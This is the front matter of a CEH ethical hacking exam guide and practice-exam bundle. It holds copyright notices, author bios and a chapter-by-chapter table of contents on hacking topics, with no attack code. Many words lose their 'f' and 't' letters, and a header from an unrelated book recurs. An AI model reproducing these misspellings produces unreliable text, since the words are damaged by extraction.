Copyright © 2022 by McGraw Hill. All rights reserved. Except as permitted under the Copyright Act of 1976, no part of this
publication may be reproduced or distributed in any form or by any means, or stored in a database or retrieval system, without
the prior written permission of publisher.

CEH™ Certified Ethical Hacker Bundle, Fifth Edition (ebundle) © 2022 by McGraw Hill
ISBN: 978-1-264-27477-2
MHID: 1-264-27477-7

The material in this ebundle also appears in the print bundle version of this title:
ISBN 978-1-264-27476-5 / MHID 1-264-27476-9:

CEH™ Certified Ethical Hacker All-in-One Exam Guide, Fifth Edition © 2022 by McGraw Hill
ISBN: 978-1-264-26994-5
MHID: 1-264-26994-3

CEH™ Certified Ethical Hacker Practice Exams, Fifith Edition © 2022 by McGraw Hill
ISBN: 978-1-264-26996-9
MHID: 1-264-26996-X

McGraw Hill books are available at special quantity discounts to use as premiums and sales promotions, or for use in corporate
training programs. To contact a representative, please visit the Contact Us pages at www.mhprofessional.com.

McGraw Hill is an independent entity from the International Council of E-Commerce Consultants® (EC-Council) and is not
affiliated with EC-Council in any manner. This study/training guide and/or material is not sponsored by, endorsed by, or
affiliated with EC-Council in any manner. This publication and accompanying media may be used in assisting students to
prepare for the Certified Ethical Hacker (CEH™) exam. Neither EC-Council nor McGraw Hill warrants that use of this
publication and accompanying media will ensure passing any exam. CEH is a trademark or registered trademark of EC-Council
in the United States and certain other countries. All other trademarks are trademarks of their respective owners.

All trademarks are trademarks of their respective owners. Rather than put a trademark symbol after every occurrence of a
trademarked name, we use names in an editorial fashion only, and to the benefit of the trademark owner, with no intention of
infringement of the trademark. Where such designations appear in this publication, they have been printed with initial caps.

Information has been obtained by McGraw Hill from sources believed to be reliable. However, because of the possibility of
human or mechanical error by our sources, McGraw Hill, or others, McGraw Hill does not guarantee the accuracy, adequacy, or
completeness of any information and is not responsible for any errors or omissions or the results obtained from the use of such
information.

TERMS OF USE

This is a copyrighted work and McGraw Hill (“McGraw Hill”) and its licensors reserve all rights in and to the work. Use of this
work is subject to these terms. Except as permitted under the Copyright Act of 1976 and the right to store and retrieve one copy
of the work, you may not decompile, disassemble, reverse engineer, reproduce, modify, create derivative works based upon,
transmit, distribute, disseminate, sell, publish or sublicense the work or any part of it without McGraw Hill’s prior consent. You
may use the work for your own noncommercial and personal use; any other use of the work is strictly prohibited. Your right to
use the work may be terminated if you fail to comply with these terms.

THE WORK IS PROVIDED “AS IS.” McGRAW HILL AND ITS LICENSORS MAKE NO GUARANTEES OR WARRANTIES
AS TO THE ACCURACY, ADEQUACY OR COMPLETENESS OF OR RESULTS TO BE OBTAINED FROM USING THE
WORK, INCLUDING ANY INFORMATION THAT CAN BE ACCESSED THROUGH THE WORK VIA HYPERLINK OR
OTHERWISE, AND EXPRESSLY DISCLAIM ANY WARRANTY, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.

McGraw Hill and its licensors do not warrant or guarantee that the functions contained in the work will meet your
requirements or that its operation will be uninterrupted or error free. Neither McGraw Hill nor its licensors shall be liable to
you or anyone else for any inaccuracy, error or omission, regardless of cause, in the work or for any damages resulting
therefrom. McGraw Hill has no responsibility for the content of any information accessed through the work. Under no
circumstances shall McGraw Hill and/or its licensors be liable for any indirect, incidental, special, punitive, consequential or
similar damages that result from the use of or inability to use the work, even if any of them has been advised of the possibility of
such damages. This limitation of liability shall apply to any claim or cause whatsoever whether such claim or cause arises in
contract, tort or otherwise.



Contents

Section I: CEH Certified Ethical Hacker All-in-One Exam Guide,
Fifth Edition

Section II: CEH Certified Ethical Hacker Practice Exams,
Fifth Edition






All-In-One / CEH™ Certied Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM
Blind Folio: i

ALL IN ONE

CEH™ Certified
Ethical Hacker

E X A M  G U I D E
Fifth Edition

00-FM.indd 1 14/09/21 4:10 PM



All-In-One / CEH™ Certied Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM
Blind Folio: ii

ABOUT THE AUTHOR

Matt Walker, CEH, is an I security and education proessional, currently working
rom his home in beautiul roy, Alabama. For over 20 years he has held a variety o
roles in virtually the entire gamut o I security, including roles as the director o the
Network raining Center and a curriculum lead/senior instructor or Cisco Networking
Academy on Ramstein AB, Germany, and as a network engineer or NASA’s Secure Net-
work Systems (NSS), designing and maintaining secured data, voice, and video network-
ing or the agency. Matt also worked as an instructor supervisor and senior instructor at
Dynetics, Inc., in Huntsville, Alabama, providing onsite certiication-awarding classes
or (ISC)2, Cisco, and CompIA, and ater two years came right back to NASA as an
I security manager or UNIeS, SAIC, at Marshall Space Flight Center. He has written
and contributed to numerous technical training books or NASA, Air Education and
raining Command, and the U.S. Air Force, as well as commercially, and he continues
to train and write certiication and college-level I and IA security courses.

About the Technical Editor
Brad Horton currently works as an intelligence specialist with the U.S. Department o
Deense. Brad has worked as a security engineer, commercial security consultant, pen-
etration tester, and inormation systems researcher in both the private and public sectors.
his has included work with several deense contractors, including General Dynamics
C4S, SAIC, and Dynetics, Inc. Brad currently holds the Certiied Inormation Systems
Security Proessional (CISSP), the CISSP – Inormation Systems Security Management
Proessional (CISSP-ISSMP), the Certiied Ethical Hacker (CEH), and the Certiied
Inormation Systems Auditor (CISA) trade certiications. Brad holds a bachelor’s degree
in Commerce and Business Administration rom the University o Alabama, a mas-
ter’s degree in Management o Inormation Systems rom the University o Alabama
in Huntsville (UAH), and a graduate certiicate in Inormation Assurance rom UAH.
When not hacking, Brad can be ound at home with his amily or on a local gol course.

he views and opinions expressed in all portions o this publication belong solely to the
author and/or editor and do not necessarily state or relect those o the Department o
Deense or the United States Government. Reerences within this publication to any spe-
ciic commercial product, process, or service by trade name, trademark, manuacturer, or
otherwise, do not necessarily constitute or imply its endorsement, recommendation, or
avoring by the United States Government.

00-FM.indd 2 14/09/21 4:10 PM



All-In-One / CEH™ Certied Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM
Blind Folio: iii

ALL IN ONE

CEH™ Certified
Ethical Hacker

E X A M  G U I D E
Fifth Edition

Matt Walker

New York Chicago San Francisco
Athens London Madrid Mexico City

Milan New Delhi Singapore Sydney Toronto

McGraw Hill is an independent entity rom the International Council o E-Commerce Consultants® (EC-Council) and is
not aliated with EC-Council in any manner. Tis study/training guide and/or material is not sponsored by, endorsed by,
or aliated with EC-Council in any manner. Tis publication and accompanying media may be used in assisting students
to prepare or the Certifed Ethical Hacker (CEH™) exam. Neither EC-Council nor McGraw Hill warrants that use o this
publication and accompanying media will ensure passing any exam. CEH is a trademark or registered trademark o EC-Council
in the United States and certain other countries. All other trademarks are trademarks o their respective owners.

00-FM.indd 3 14/09/21 4:10 PM



Copyright © 2022 by McGraw Hill. All rights reserved. Except as permitted under the United States Copyright Act of 1976,
no part of this publication may be reproduced or distributed in any form or by any means, or stored in a database or retrieval
system, without the prior written permission of the publisher.

ISBN: 978-1-26-426995-2
MHID: 1-26-426995-1

The material in this eBook also appears in the print version of this title: ISBN: 978-1-26-426994-5,
MHID: 1-26-426994-3.

eBook conversion by codeMantra
Version 1.0

All trademarks are trademarks of their respective owners. Rather than put a trademark symbol after every occurrence of a
trademarked name, we use names in an editorial fashion only, and to the benet of the trademark owner, with no intention of
infringement of the trademark. Where such designations appear in this book, they have been printed with initial caps.

McGraw-Hill Education eBooks are available at special quantity discounts to use as premiums and sales promotions or for
use in corporate training programs. To contact a representative, please visit the Contact Us page at www.mhprofessional.com.

Information has been obtained by McGraw Hill from sources believed to be reliable. However, because of the possibility of
human or mechanical error by our sources, McGraw Hill, or others, McGraw Hill does not guarantee the accuracy, adequacy,
or completeness of any information and is not responsible for any errors or omissions or the results obtained from the use of
such information.

The views and opinions expressed in all portions of this publication belong solely to the author and/or editor and do not neces-
sarily state or reect those of the Department of Defense or the United States Government. References within this publication
to any specic commercial product, process, or service by trade name, trademark, manufacturer, or otherwise, do not necessar-
ily constitute or imply its endorsement, recommendation, or favoring by the United States Government.

Some glossary terms included in this book may be considered public information as designated by The National Institute of
Standards and Technology (NIST). NIST is an agency of the U.S. Department of Commerce. Please visit https://www.nist.gov
for more information.

TERMS OF USE

This is a copyrighted work and McGraw-Hill Education and its licensors reserve all rights in and to the work. Use of this work
is subject to these terms. Except as permitted under the Copyright Act of 1976 and the right to store and retrieve one copy of the
work, you may not decompile, disassemble, reverse engineer, reproduce, modify, create derivative works based upon, transmit,
distribute, disseminate, sell, publish or sublicense the work or any part of it without McGraw-Hill Education’s prior consent.
You may use the work for your own noncommercial and personal use; any other use of the work is strictly prohibited. Your
right to use the work may be terminated if you fail to comply with these terms.

THE WORK IS PROVIDED “AS IS.” McGRAW-HILL EDUCATION AND ITS LICENSORS MAKE NO GUARANTEES
OR WARRANTIES AS TO THE ACCURACY, ADEQUACY OR COMPLETENESS OF OR RESULTS TO BE OBTAINED
FROM USING THE WORK, INCLUDING ANY INFORMATION THAT CAN BE ACCESSED THROUGH THE WORK
VIA HYPERLINK OR OTHERWISE, AND EXPRESSLY DISCLAIM ANY WARRANTY, EXPRESS OR IMPLIED, IN-
CLUDING BUT NOT LIMITED TO IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PAR-
TICULAR PURPOSE. McGraw-Hill Education and its licensors do not warrant or guarantee that the functions contained in
the work will meet your requirements or that its operation will be uninterrupted or error free. Neither McGraw-Hill Education
nor its licensors shall be liable to you or anyone else for any inaccuracy, error or omission, regardless of cause, in the work
or for any damages resulting therefrom. McGraw-Hill Education has no responsibility for the content of any information ac-
cessed through the work. Under no circumstances shall McGraw-Hill Education and/or its licensors be liable for any indirect,
incidental, special, punitive, consequential or similar damages that result from the use of or inability to use the work, even if
any of them has been advised of the possibility of such damages. This limitation of liability shall apply to any claim or cause
whatsoever whether such claim or cause arises in contract, tort or otherwise.



All-In-One / CEH™ Certied Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM
Blind Folio: v

Tis book is dedicated to my grandson, Walker Marshall Byrd.
May your future be as bright as your smile, and always remember

Grandpa is your favorite…

00-FM.indd 5 14/09/21 4:10 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CONTENTS AT A GLANCE

Chapter 1 Getting Started: Essential Knowledge . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1

Chapter 2 Reconnaissance: Inormation Gathering or the Ethical Hacker . . . . . . . 51

Chapter 3 Scanning and Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89

Chapter 4 Snifng and Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 143

Chapter 5 Attacking a System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189

Chapter 6 Web-Based Hacking: Servers and Applications . . . . . . . . . . . . . . . . . . . . . . . 235

Chapter 7 Wireless Network Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279

Chapter 8 Mobile Communications and the IoT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305

Chapter 9 Security in Cloud Computing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343

Chapter 10 Trojans and Other Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371

Chapter 11 Cryptography 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 409

Chapter 12 Low Tech: Social Engineering and Physical Security . . . . . . . . . . . . . . . . . 453

Chapter 13 The Pen Test: Putting It All Together . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 485

Appendix A Tool, Sites, and Reerences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 503

Appendix B About the Online Content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 527

Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 531

Index . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 563

vii

00-FM.indd 7 14/09/21 4:10 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CONTENTS

Acknowledgments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xv
Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xvii

Chapter 1 Getting Started: Essential Knowledge . . . . . . . . . . . . . . . . . . . . . . . .  1

Security 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Essentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Security Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15

Introduction to Ethical Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
Hacking erminology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
he Ethical Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 45
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48

Chapter 2 Reconnaissance: Inormation Gathering or the Ethical Hacker . . . 51

Footprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52
Passive Footprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54
Active Footprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56

Footprinting Methods and ools . . . . . . . . . . . . . . . . . . . . . . . . . . . 57
Search Engines . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57
Website and E-mail Footprinting . . . . . . . . . . . . . . . . . . . . . . 66
DNS Footprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67
Network Footprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79
Other ools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87

Chapter 3 Scanning and Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  89

Fundamentals . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
CP/IP Networking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
Subnetting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98

Scanning Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102
Identiying argets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103
Port Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106
Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
Vulnerability Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119

Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121
Windows System Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 121
Unix/Linux System Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . 123
Enumeration echniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124

ix

00-FM.indd 9 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

x

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140

Chapter 4 Snifng and Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  143

Essentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144
Network Knowledge or Sniing . . . . . . . . . . . . . . . . . . . . . . 144
Active and Passive Sniing . . . . . . . . . . . . . . . . . . . . . . . . . . . 156

Sniing ools and echniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 157
echniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 157
ools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162

Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165
Devices Aligned Against You . . . . . . . . . . . . . . . . . . . . . . . . . 166
Evasion echniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187

Chapter 5 Attacking a System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  189

Getting Started . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190
Windows Security Architecture . . . . . . . . . . . . . . . . . . . . . . . 190
Linux Security Architecture . . . . . . . . . . . . . . . . . . . . . . . . . . 198
Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203

Hacking Steps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206
Authentication and Passwords . . . . . . . . . . . . . . . . . . . . . . . . 207
Privilege Escalation and Executing Applications . . . . . . . . . . 216
Hiding Files and Covering racks . . . . . . . . . . . . . . . . . . . . . 219

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 230
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232

Chapter 6 Web-Based Hacking: Servers and Applications . . . . . . . . . . . . . . . .  235

Web Servers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 236
Nonproit Organizations Promoting Web Security . . . . . . . . 236
Attack Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 241
Web Server Architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242
Web Server Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250

Attacking Web Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 256
Application Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 257
Countermeasures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 270
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 277

00-FM.indd 10 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Contents

xi

Chapter 7 Wireless Network Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  279

Wireless Networking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280
Wireless erminology, Architecture, and Standards . . . . . . . . 280
Wireless Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 289

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 301
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 303

Chapter 8 Mobile Communications and the IoT . . . . . . . . . . . . . . . . . . . . . . . . .  305

he Mobile World . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306
Mobile Vulnerabilities and Risks . . . . . . . . . . . . . . . . . . . . . . 307
Mobile Platorms and Attacks . . . . . . . . . . . . . . . . . . . . . . . . 311

Io . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317
Io Architecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 318
Io Vulnerabilities and Attacks . . . . . . . . . . . . . . . . . . . . . . . 320
Io Hacking Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . 327

O Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331
Deinition and Concepts . . . . . . . . . . . . . . . . . . . . . . . . . . . . 332
Security Concerns . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 334

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 342

Chapter 9 Security in Cloud Computing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  343

Cloud Computing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 344
Cloud Computing Service ypes . . . . . . . . . . . . . . . . . . . . . . 346
Cloud Deployment Models . . . . . . . . . . . . . . . . . . . . . . . . . . 349

Cloud Security . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352
Cloud hreats . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354
Cloud Attacks and Mitigations . . . . . . . . . . . . . . . . . . . . . . . 359
Cloud Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 360

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 363
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 368

Chapter 10 Trojans and Other Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  371

he “Malware” Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372
rojans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375
Viruses and Worms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 379
Fileless Malware . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 385
Malware Analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 387
Malware Countermeasures . . . . . . . . . . . . . . . . . . . . . . . . . . . 389

Remaining Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 391
Denial o Service . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 391
Session Hijacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 395

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 399
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 404
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 406

00-FM.indd 11 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xii

Chapter 11 Cryptography 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  409

Cryptography and Encryption Overview . . . . . . . . . . . . . . . . . . . . . 410
erminology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 410
Encryption Algorithms and echniques . . . . . . . . . . . . . . . . . 411

PKI, the Digital Certiicate, and Digital Signatures . . . . . . . . . . . . . 424
he PKI System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 425
Digital Certiicates . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 428
Digital Signatures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 432
o Sum Up . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 433

Encrypted Communication and Cryptography Attacks . . . . . . . . . . 433
Encrypted Communication . . . . . . . . . . . . . . . . . . . . . . . . . . 436
Cryptography Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 441

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 443
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 447
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450

Chapter 12 Low Tech: Social Engineering and Physical Security . . . . . . . . . . .  453

Social Engineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454
Human-Based Social Engineering Attacks . . . . . . . . . . . . . . . 456
Computer-Based Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . 462
Mobile-Based Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 468
Preventing Social Engineering Attacks . . . . . . . . . . . . . . . . . . 469

Physical Security . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 472
Physical Security 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 472
esting Physical Security . . . . . . . . . . . . . . . . . . . . . . . . . . . . 478

Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 479
Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 481
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 484

Chapter 13 The Pen Test: Putting It All Together . . . . . . . . . . . . . . . . . . . . . . . . . .  485

Methodology and Steps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 486
Security Assessments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 487
Security Assessment Deliverables . . . . . . . . . . . . . . . . . . . . . . 494
Guidelines . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 496

More erminology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 496
Chapter Review . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 498

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 500
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 502

Appendix A Tool, Sites, and Reerences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  503

Vulnerability Research Sites . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 503
Footprinting ools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 504
Scanning and Enumeration ools . . . . . . . . . . . . . . . . . . . . . . . . . . 507
System Hacking ools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 510
Cryptography and Encryption . . . . . . . . . . . . . . . . . . . . . . . . . . . . 515
Sniing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 516

00-FM.indd 12 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Contents

xiii

Wireless . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 517
Mobile and Io . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 518
rojans and Malware . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 521
Web Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 523
Miscellaneous . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524
ools, Sites, and Reerences Disclaimer . . . . . . . . . . . . . . . . . . . . . . 525

Appendix B About the Online Content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  527

System Requirements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 527
Your otal Seminars raining Hub Account . . . . . . . . . . . . . . . . . . 527

Privacy Notice . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 527
Single User License erms and Conditions . . . . . . . . . . . . . . . . . . . 527
otalester Online . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 529
echnical Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 529

Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  531

Index . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  563

00-FM.indd 13 14/09/21 4:10 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

